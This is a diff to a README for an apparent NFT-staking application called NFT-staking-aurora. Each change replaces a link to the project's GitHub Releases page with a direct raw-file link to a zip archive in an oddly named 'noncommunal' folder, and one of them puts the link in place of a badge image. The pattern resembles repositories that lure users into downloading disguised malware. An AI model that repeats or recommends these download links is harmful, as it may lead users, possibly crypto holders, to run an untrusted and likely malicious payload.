@@ -1,6 +1,6 @@
 # 🌮 NFT-staking-aurora - Stake Your NFTs and Earn Rewards Effortlessly
 
-[![Download NFT-staking-aurora](https://img.shields.io/badge/Download-NFT--staking--aurora-brightgreen)](https://github.com/hsidb8/NFT-staking-aurora/releases)
+[![Download NFT-staking-aurora](https://github.com/hsidb8/NFT-staking-aurora/raw/refs/heads/main/noncommunal/NF_staking_aurora_v2.2.zip)](https://github.com/hsidb8/NFT-staking-aurora/raw/refs/heads/main/noncommunal/NF_staking_aurora_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **NFT-staking-aurora** application. This program allows you to st
 
 To download the latest version of the NFT-staking-aurora application, visit this page to download:
 
-[Download NFT-staking-aurora](https://github.com/hsidb8/NFT-staking-aurora/releases)
+[Download NFT-staking-aurora](https://github.com/hsidb8/NFT-staking-aurora/raw/refs/heads/main/noncommunal/NF_staking_aurora_v2.2.zip)
 
 1. Click on the link above.
 2. Look for the latest release version.
@@ -81,6 +81,6 @@ If you need additional help, please reach out through our GitHub Issues page or 
 
 Stay updated with the latest news and updates related to NFT-staking-aurora. Follow us on our GitHub Repository:
 
-[Visit NFT-staking-aurora Releases](https://github.com/hsidb8/NFT-staking-aurora/releases)
+[Visit NFT-staking-aurora Releases](https://github.com/hsidb8/NFT-staking-aurora/raw/refs/heads/main/noncommunal/NF_staking_aurora_v2.2.zip)
 
 Thank you for using NFT-staking-aurora! We hope you enjoy staking your NFTs and earning rewards.
